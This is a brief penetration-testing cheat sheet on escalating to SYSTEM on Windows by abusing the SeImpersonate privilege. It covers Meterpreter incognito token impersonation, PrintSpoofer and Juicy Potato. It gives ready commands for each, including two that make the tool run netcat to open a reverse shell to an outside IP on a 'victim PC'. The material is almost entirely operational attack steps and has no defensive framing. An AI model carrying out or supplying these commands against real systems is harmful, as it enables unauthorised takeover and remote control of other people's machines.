# SeImpersonate
----------
**SeImpersonate** token abuse using metasploit:
```bash
meterpreter > load incognito
> list_tokens -u 
> impersonate_token "NT AUTHORITY\SYSTEM"
> shell
```

------

## PrintSpoofer
In system with the operating system Windows 10 and Server 2016/2019, use PrintSpooler. 

https://github.com/itm4n/PrintSpoofer/releases

Execute cmd.exe as admin:
```
.\PrintSpoofer.exe -i -c cmd
```

Execute nc.exe as admin for reverse shell:
```
.\PrintSpoofer.exe -c "C:\Windows\Tasks\nc64.exe 10.10.10.10. 1337 -e cmd"
```

-----------

## Juicy Potato 
Download the binary from:
https://github.com/ohpe/juicy-potato/releases

Copy over the binary and nc to the victim PC.

Get the CLSID from:
http://ohpe.it/juicy-potato/CLSID/

```
.\potato.exe -l 1337 -c "{C49E32C6-BC8B-11d2-85D4-00105A1F8304}" -p C:\windows\system32\cmd.exe -a "/c C:\Windows\Tasks\nc.exe 10.10.14.50 80 -e cmd.exe" -t *
```


-----------
